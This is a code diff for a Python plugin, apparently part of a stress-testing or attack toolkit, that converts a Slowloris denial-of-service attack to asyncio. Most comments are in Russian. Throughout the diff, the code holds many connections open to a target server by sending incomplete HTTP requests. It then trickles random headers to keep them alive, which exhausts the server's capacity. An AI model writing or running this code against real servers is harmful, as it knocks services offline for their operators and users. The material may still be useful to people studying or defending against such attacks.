@@ -2,17 +2,19 @@
 from plugins.plugin_manager import BasePlugin, PluginInfo
 from typing import Dict, Any, List
 import asyncio
-import socket
 import random
 import time
+import logging
 from colorama import Fore, Style
+
+logger = logging.getLogger(__name__)
 
 
 class SlowlorisPlugin(BasePlugin):
-    """Slowloris атака - множество долгоживущих неполных соединений"""
+    """Slowloris атака - множество долгоживущих неполных соединений (асинхронная версия)"""
     
     def __init__(self):
-        self.connections: List[socket.socket] = []
+        self.connections: List[asyncio.StreamWriter] = []
         self.running = False
         self.sent_connections = 0
         
@@ -63,16 +65,16 @@ class SlowlorisPlugin(BasePlugin):
         }
     
     async def maintain_connection(self, host: str, port: int, conn_id: int):
-        """Поддержание одного неполного соединения"""
-        sock = None
+        """Поддержание одного неполного соединения (асинхронно)"""
+        reader = None
+        writer = None
         
         try:
-            # Создаем соединение
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(self.timeout)
-            
-            # Подключаемся
-            sock.connect((host, port))
+            # Устанавливаем асинхронное соединение
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port, ssl=(port == 443)),
+                timeout=self.timeout
+            )
             self.sent_connections += 1
             
             # Отправляем неполный HTTP запрос
@@ -82,50 +84,51 @@ class SlowlorisPlugin(BasePlugin):
             request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
             # НЕ отправляем завершающие \r\n - соединение остается открытым
             
-            sock.send(request.encode())
+            writer.write(request.encode())
+            await asyncio.wait_for(writer.drain(), timeout=2.0)
             
             # Периодически отправляем дополнительные заголовки
             while self.running:
                 await asyncio.sleep(random.randint(5, 15))
                 
-                if self.running and sock:
+                if self.running and writer and not writer.is_closing():
                     # Отправляем еще один заголовок
                     header = f"X-{random.randint(1000, 9999)}: {random.randint(10000, 99999)}\r\n"
-                    sock.send(header.encode())
+                    writer.write(header.encode())
+                    try:
+                        await asyncio.wait_for(writer.drain(), timeout=2.0)
+                    except asyncio.TimeoutError:
+                        break
                     
                     # Вывод статистики каждые 10 соединений
                     if conn_id % 10 == 0:
                         print(f"\r{Fore.WHITE}🐌 Active connections: {self.sent_connections}{Style.RESET_ALL}", end="")
         
-        except (socket.error, ConnectionError, OSError):
-            # Соединение разорвано - пытаемся восстановить
-            pass
+        except (asyncio.TimeoutError, ConnectionError, OSError, asyncio.IncompleteReadError) as e:
+            # Соединение разорвано или не удалось установить
+            if self.running and conn_id % 20 == 0:
+                print(f"\n{Fore.YELLOW}⚠️  Connection {conn_id} failed: {e}{Style.RESET_ALL}")
+                logger.debug(f"Slowloris connection {conn_id} error: {e}")
         finally:
-            if sock:
+            if writer and not writer.is_closing():
                 try:
-                    sock.close()
-                except:
+                    writer.close()
+                    await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
+                except Exception:
                     pass
     
     async def cleanup(self):
         """Очистка ресурсов"""
         self.running = False
-        
-        # Закрываем все соединения
-        for sock in self.connections:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        self.connections.clear()
+        # Даем время на завершение
+        await asyncio.sleep(0.5)
         print(f"\n{Fore.GREEN}✅ Slowloris attack stopped{Style.RESET_ALL}")
     
     def get_info(self) -> PluginInfo:
         return PluginInfo(
             name="Slowloris",
-            version="2.1.0",
+            version="2.2.0",
             author="DiamondEye Security",
-            description="Low-bandwidth Slowloris attack that holds connections open",
+            description="Low-bandwidth Slowloris attack that holds connections open (async)",
             attack_types=['http', 'https']
         )
